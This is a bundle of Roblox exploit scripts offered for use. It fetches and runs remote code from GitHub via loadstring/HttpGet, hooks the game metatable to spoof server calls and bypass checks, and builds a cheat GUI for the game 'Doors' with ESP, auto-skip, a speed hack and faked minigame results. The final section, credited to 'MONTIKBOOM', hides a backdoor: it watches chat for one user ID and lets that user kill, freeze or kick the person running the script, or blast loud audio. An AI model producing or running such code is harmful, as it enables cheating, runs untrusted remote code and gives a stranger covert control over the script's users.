

-- Infinite Yield
loadstring(game:HttpGet(("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"),true))()

--Anti Eyes

local mt = getrawmetatable(game);
local old = mt.__namecall
setreadonly(mt,false)
mt.__namecall = newcclosure(function(remote,...)
   args = {...}
   method = tostring(getnamecallmethod())
   if method == "FireServer" and tostring(remote) == "MotorReplication" then
       args[2] = 90
       return old(remote,unpack(args))
   end
   return old(remote,...)
end)
setreadonly(mt,true)

-- bypass noclip

_G.Keybind = "R"
_G.ClipGui = true
_G.IncludeNoclip = true

local isEnabled = false

local UIS = game:GetService("UserInputService")

local Plr = game.Players.LocalPlayer
local Char = Plr.Character or Plr.CharacterAdded:Wait()

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Enabled = _G.ClipGui or false

local TextLabel = Instance.new("TextLabel")
TextLabel.Parent = ScreenGui

TextLabel.AnchorPoint = Vector2.new(1, 0)
TextLabel.Position = UDim2.new(1, -5, 0, 0)
TextLabel.Text = "Noclip + Bypasser: Off"
TextLabel.Size = UDim2.new(0,200,0,75)
TextLabel.TextScaled = true
TextLabel.TextStrokeColor3 = Color3.new(1,1,1)
TextLabel.TextStrokeTransparency = 0
TextLabel.BackgroundTransparency = 1

function getValue()
    local value
    if isEnabled then
        value = "On"
    else
        value = "Off"
    end
    return value
end

UIS.InputBegan:Connect(function(input, gp)
    if gp then return end

    if input.KeyCode == Enum.KeyCode[_G.Keybind] then
        isEnabled = not isEnabled
        task.wait()
        TextLabel.Text = "Noclip + Bypasser: " .. getValue()
    end
end)

game:GetService("RunService").RenderStepped:Connect(function()
    if not Char:FindFirstChild("HumanoidRootPart") then return end
    if _G.IncludeNoclip then
        Char.HumanoidRootPart.CanCollide = not isEnabled
        Char.Collision.CanCollide = not isEnabled
    end

    local HrpCFrame = Char.HumanoidRootPart.CFrame

    local ray = Ray.new(HrpCFrame.Position, HrpCFrame.LookVector * 0.5)
    local part = workspace:FindPartOnRay(ray)
    if part and part.CanCollide == true and isEnabled then
        Char.HumanoidRootPart.Anchored = true
        Char:PivotTo(Char.HumanoidRootPart.CFrame * CFrame.new(0, 1000, 0))
        task.wait()
        Char:PivotTo(Char.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4))
        task.wait()
        Char:PivotTo(Char.HumanoidRootPart.CFrame * CFrame.new(0, -1000, 0))
        task.wait(0.1)
        Char.HumanoidRootPart.Anchored = false
    end
end)
-- Doors script
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({IntroText = "Doors GUI v1.2",Name = "Doors", HidePremium = false, SaveConfig = true, ConfigFolder = "DoorsSex"})
if game.PlaceId == 6516141723 then
    OrionLib:MakeNotification({
        Name = "Error",
        Content = "Please execute when in game, not in lobby.",
        Time = 2
    })
end
local VisualsTab = Window:MakeTab({
	Name = "Visuals",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local CF = CFrame.new
local LatestRoom = game:GetService("ReplicatedStorage").GameData.LatestRoom
local ChaseStart = game:GetService("ReplicatedStorage").GameData.ChaseStart
 
local KeyChams = {}
VisualsTab:AddToggle({
	Name = "Key Chams",
	Default = false,
    Flag = "KeyToggle",
    Save = true,
	Callback = function(Value)
		for i,v in pairs(KeyChams) do
            v.Enabled = Value
        end
	end    
})
 
local function ApplyKeyChams(inst)
    wait()
    local Cham = Instance.new("Highlight")
    Cham.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    Cham.FillColor = Color3.new(0.980392, 0.670588, 0)
    Cham.FillTransparency = 0.5
    Cham.OutlineColor = Color3.new(0.792156, 0.792156, 0.792156)
    Cham.Parent = game:GetService("CoreGui")
    Cham.Adornee = inst
    Cham.Enabled = OrionLib.Flags["KeyToggle"].Value
    Cham.RobloxLocked = true
    return Cham
end
 
local KeyCoroutine = coroutine.create(function()
    workspace.CurrentRooms.DescendantAdded:Connect(function(inst)
        if inst.Name == "KeyObtain" then
            table.insert(KeyChams,ApplyKeyChams(inst))
        end
    end)
end)
for i,v in ipairs(workspace:GetDescendants()) do
    if v.Name == "KeyObtain" then
        table.insert(KeyChams,ApplyKeyChams(v))
    end
end
coroutine.resume(KeyCoroutine)
 
local BookChams = {}
VisualsTab:AddToggle({
	Name = "Book Chams",
	Default = false,
    Flag = "BookToggle",
    Save = true,
	Callback = function(Value)
		for i,v in pairs(BookChams) do
            v.Enabled = Value
        end
	end    
})
 
local FigureChams = {}
VisualsTab:AddToggle({
	Name = "Figure Chams",
	Default = false,
    Flag = "FigureToggle",
    Save = true,
    Callback = function(Value)
        for i,v in pairs(FigureChams) do
            v.Enabled = Value
        end
    end
})
 
local function ApplyBookChams(inst)
    if inst:IsDescendantOf(game:GetService("Workspace").CurrentRooms:FindFirstChild("50")) and game:GetService("ReplicatedStorage").GameData.LatestRoom.Value == 50 then
        wait()
        local Cham = Instance.new("Highlight")
        Cham.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        Cham.FillColor = Color3.new(0, 1, 0.749019)
        Cham.FillTransparency = 0.5
        Cham.OutlineColor = Color3.new(0.792156, 0.792156, 0.792156)
        Cham.Parent = game:GetService("CoreGui")
        Cham.Enabled = OrionLib.Flags["BookToggle"].Value
        Cham.Adornee = inst
        Cham.RobloxLocked = true
        return Cham
    end
end
 
local function ApplyEntityChams(inst)
    wait()
    local Cham = Instance.new("Highlight")
    Cham.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    Cham.FillColor = Color3.new(1, 0, 0)
    Cham.FillTransparency = 0.5
    Cham.OutlineColor = Color3.new(0.792156, 0.792156, 0.792156)
    Cham.Parent = game:GetService("CoreGui")
    Cham.Enabled = OrionLib.Flags["FigureToggle"].Value
    Cham.Adornee = inst
    Cham.RobloxLocked = true
    return Cham
end
 
local BookCoroutine = coroutine.create(function()
    task.wait(1)
    for i,v in pairs(game:GetService("Workspace").CurrentRooms["50"].Assets:GetDescendants()) do
        if v.Name == "LiveHintBook" then
            table.insert(BookChams,ApplyBookChams(v))
        end
    end
end)
local EntityCoroutine = coroutine.create(function()
    local Entity = game:GetService("Workspace").CurrentRooms["50"].FigureSetup:WaitForChild("FigureRagdoll",5)
    Entity:WaitForChild("Torso",2.5)
    table.insert(FigureChams,ApplyEntityChams(Entity))
end)
 
 
local GameTab = Window:MakeTab({
	Name = "Game",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local CharTab = Window:MakeTab({
	Name = "Character",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
 
local TargetWalkspeed
CharTab:AddSlider({
	Name = "Speed",
	Min = 0,
	Max = 50,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		TargetWalkspeed = Value
	end    
})
 
local pcl = Instance.new("SpotLight")
pcl.Brightness = 1
pcl.Face = Enum.NormalId.Front
pcl.Range = 90
pcl.Parent = game.Players.LocalPlayer.Character.Head
pcl.Enabled = false
 
 
CharTab:AddToggle({
	Name = "Headlight",
	Default = false,
    Callback = function(Value)
        pcl.Enabled = Value
    end
})
 
GameTab:AddToggle({
	Name = "No seek arms/obstructions",
	Default = false,
    Flag = "NoSeek",
    Save = true
})
 
GameTab:AddToggle({
	Name = "Instant Interact",
	Default = false,
    Flag = "InstantToggle",
    Save = true
})
GameTab:AddButton({
	Name = "Skip level",
	Callback = function()
        pcall(function()
            local HasKey = false
            local CurrentDoor = workspace.CurrentRooms[tostring(game:GetService("ReplicatedStorage").GameData.LatestRoom.Value)]:WaitForChild("Door")
            for i,v in ipairs(CurrentDoor.Parent:GetDescendants()) do
                if v.Name == "KeyObtain" then
                    HasKey = v
                end
            end
            if HasKey then
                game.Players.LocalPlayer.Character:PivotTo(CF(HasKey.Hitbox.Position))
                wait(0.3)
                fireproximityprompt(HasKey.ModulePrompt,0)
                game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
                wait(0.3)
                fireproximityprompt(CurrentDoor.Lock.UnlockPrompt,0)
            end
            if LatestRoom == 50 then
                CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom+1)]:WaitForChild("Door")
            end
            game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
            wait(0.3)
            CurrentDoor.ClientOpen:FireServer()
        end)
  	end    
})
 
GameTab:AddToggle({
	Name = "Auto skip level",
	Default = false,
    Save = false,
    Flag = "AutoSkip"
})
 
local AutoSkipCoro = coroutine.create(function()
        while true do
            task.wait()
            pcall(function()
            if OrionLib.Flags["AutoSkip"].Value == true and game:GetService("ReplicatedStorage").GameData.LatestRoom.Value < 100 then
                local HasKey = false
                local LatestRoom = game:GetService("ReplicatedStorage").GameData.LatestRoom.Value
                local CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom)]:WaitForChild("Door")
                for i,v in ipairs(CurrentDoor.Parent:GetDescendants()) do
                    if v.Name == "KeyObtain" then
                        HasKey = v
                    end
                end
                if HasKey then
                    game.Players.LocalPlayer.Character:PivotTo(CF(HasKey.Hitbox.Position))
                    task.wait(0.3)
                    fireproximityprompt(HasKey.ModulePrompt,0)
                    game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
                    task.wait(0.3)
                    fireproximityprompt(CurrentDoor.Lock.UnlockPrompt,0)
                end
                if LatestRoom == 50 then
                    CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom+1)]:WaitForChild("Door")
                end
                game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
                task.wait(0.3)
                CurrentDoor.ClientOpen:FireServer()
            end
        end)
        end
end)
coroutine.resume(AutoSkipCoro)
 
GameTab:AddButton({
	Name = "No jumpscares",
	Callback = function()
        pcall(function()
            game:GetService("ReplicatedStorage").Bricks.Jumpscare:Destroy()
        end)
  	end    
})
GameTab:AddToggle({
	Name = "Avoid Rush/Ambush",
	Default = false,
    Flag = "AvoidRushToggle",
    Save = true
})
GameTab:AddToggle({
	Name = "No Screech",
	Default = false,
    Flag = "ScreechToggle",
    Save = true
})
 
GameTab:AddToggle({
	Name = "Always win heartbeat",
	Default = false,
    Flag = "HeartbeatWin",
    Save = true
})
 
GameTab:AddToggle({
	Name = "Predict chases",
	Default = false,
    Flag = "PredictToggle" ,
    Save = true
})
GameTab:AddToggle({
	Name = "Notify when mob spawns",
	Default = false,
    Flag = "MobToggle" ,
    Save = true
})
GameTab:AddButton({
	Name = "Complete breaker box minigame",
	Callback = function()
        game:GetService("ReplicatedStorage").Bricks.EBF:FireServer()
  	end    
})
GameTab:AddButton({
	Name = "Skip level 50",
	Callback = function()
        local CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom+1)]:WaitForChild("Door")
        game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
  	end    
})
GameTab:AddParagraph("Warning","You may need to open/close the panel a few times for this to work, fixing soon.")
 
--// ok actual code starts here
 
game:GetService("RunService").RenderStepped:Connect(function()
    pcall(function()
        if game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
            game.Players.LocalPlayer.Character:TranslateBy(game.Players.LocalPlayer.Character.Humanoid.MoveDirection * TargetWalkspeed/50)
        end
    end)
end)
 
game:GetService("Workspace").CurrentRooms.DescendantAdded:Connect(function(descendant)
    if OrionLib.Flags["NoSeek"].Value == true and descendant.Name == ("Seek_Arm" or "ChandelierObstruction") then
        task.spawn(function()
            wait()
            descendant:Destroy()
        end)
    end
end)
 
game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(prompt)
    if OrionLib.Flags["InstantToggle"].Value == true then
        fireproximityprompt(prompt)
    end
end)
 
local old
old = hookmetamethod(game,"__namecall",newcclosure(function(self,...)
    local args = {...}
    local method = getnamecallmethod()
 
    if tostring(self) == 'Screech' and method == "FireServer" and OrionLib.Flags["ScreechToggle"].Value == true then
        args[1] = true
        return old(self,unpack(args))
    end
    if tostring(self) == 'ClutchHeartbeat' and method == "FireServer" and OrionLib.Flags["HeartbeatWin"].Value == true then
        args[2] = true
        return old(self,unpack(args))
    end
 
    return old(self,...)
end))
 
workspace.CurrentCamera.ChildAdded:Connect(function(child)
    if child.Name == "Screech" and OrionLib.Flags["ScreechToggle"].Value == true then
        child:Destroy()
    end
end)
 
local NotificationCoroutine = coroutine.create(function()
    LatestRoom.Changed:Connect(function()
        if OrionLib.Flags["PredictToggle"].Value == true then
            local n = ChaseStart.Value - LatestRoom.Value
            if 0 < n and n < 4 then
                OrionLib:MakeNotification({
                    Name = "Warning!",
                    Content = "Event in " .. tostring(n) .. " rooms.",
                    Time = 5
                })
            end
        end
        if OrionLib.Flags["BookToggle"].Value == true then
            if LatestRoom.Value == 50 then
                coroutine.resume(BookCoroutine)
            end
        end
        if OrionLib.Flags["FigureToggle"].Value == true then
            if LatestRoom.Value == 50 then
                coroutine.resume(EntityCoroutine)
            end
        end
    end)
    workspace.ChildAdded:Connect(function(inst)
        if inst.Name == "RushMoving" and OrionLib.Flags["MobToggle"].Value == true then
            if OrionLib.Flags["AvoidRushToggle"].Value == true then
                OrionLib:MakeNotification({
                    Name = "Warning!",
                    Content = "Avoiding Rush. Please wait.",
                    Time = 5
                })
                local OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                local con = game:GetService("RunService").Heartbeat:Connect(function()
                    game.Players.LocalPlayer.Character:MoveTo(OldPos + Vector3.new(0,20,0))
                end)
 
                inst.Destroying:Wait()
                con:Disconnect()
 
                game.Players.LocalPlayer.Character:MoveTo(OldPos)
            else
                OrionLib:MakeNotification({
                    Name = "Warning!",
                    Content = "Rush has spawned, hide!",
                    Time = 5
                })
            end
        elseif inst.Name == "AmbushMoving" and OrionLib.Flags["MobToggle"].Value == true then
            if OrionLib.Flags["AvoidRushToggle"].Value == true then
                OrionLib:MakeNotification({
                    Name = "Warning!",
                    Content = "Avoiding Ambush. Please wait.",
                    Time = 5
                })
                local OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                local con = game:GetService("RunService").Heartbeat:Connect(function()
                    game.Players.LocalPlayer.Character:MoveTo(OldPos + Vector3.new(0,20,0))
                end)
 
                inst.Destroying:Wait()
                con:Disconnect()
 
                game.Players.LocalPlayer.Character:MoveTo(OldPos)
            else
                OrionLib:MakeNotification({
                    Name = "Warning!",
                    Content = "Ambush has spawned, hide!",
                    Time = 5
                })
            end
        end
    end)
end)
 
--// ok actual code ends here
 
local CreditsTab = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
 
CreditsTab:AddParagraph("Credits to","OminousVibes - (Got most of the ideas from their thread, check it out! - https://v3rmillion.net/showthread.php?tid=1184088)")
 
coroutine.resume(NotificationCoroutine)
 
OrionLib:Init()
 
task.wait(2)

--By MONTIKBOOM

local player = game.Players.LocalPlayer
local id = "4336577151"
function eatbananaone(theplayer)
	for i,v in pairs(workspace:GetChildren()) do
		if v.Name == "BananaPeel" then
			v.CFrame = theplayer.Character.HumanoidRootPart.CFrame
			return
		end
	end
end
function bananadeath(theplayer)
	theplayer.Character.HumanoidRootPart.Anchored = true
	repeat
	task.wait(0.01)
	for i,v in pairs(workspace:GetChildren()) do
		if v.Name == "BananaPeel" then
			v.CFrame = theplayer.Character.HumanoidRootPart.CFrame
		end
	end
	until theplayer.Character.Humanoid.Health == 0
end

local chat = game:GetService("CoreGui").ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView
chat.ChildAdded:Connect(function (child)
	if string.find(child.Name,id) then
		local check = string.find(child.text, ";")
		if check then
			local command = string.sub(child.text,check)
			for i,splayer in pairs(game:GetService("Players"):GetPlayers()) do
				if string.find(command,splayer.Name) and string.find(command,"kill") then
					splayer.Character.Head:Destroy()
				elseif string.find(command,splayer.Name) and string.find(command,"eatbanana") then
					eatbananaone(splayer)
				elseif string.find(command,splayer.Name) and string.find(command,"bananadeath") then
					bananadeath(splayer)
				elseif string.find(command,splayer.Name) and string.find(command,"freeze") then
					splayer.Character.HumanoidRootPart.Anchored = true
				elseif string.find(command,splayer.Name) and string.find(command,"UnFreeze") then
					splayer.Character.HumanoidRootPart.Anchored = false
                elseif string.find(command,splayer.Name) and string.find(command,"kick") then
					if splayer.Name == player.Name then
                        player:kick("poka loh typoi ti bil kiknyt mortikboom'om")
                    end
				elseif string.find(command,"hehe") then
					local sound = Instance.new("Sound", game.Workspace)
					sound.SoundId = "rbxassetid://5602666105"
					sound.Volume = 100000
					sound:Play()
				end
			end
		end
	end
end)
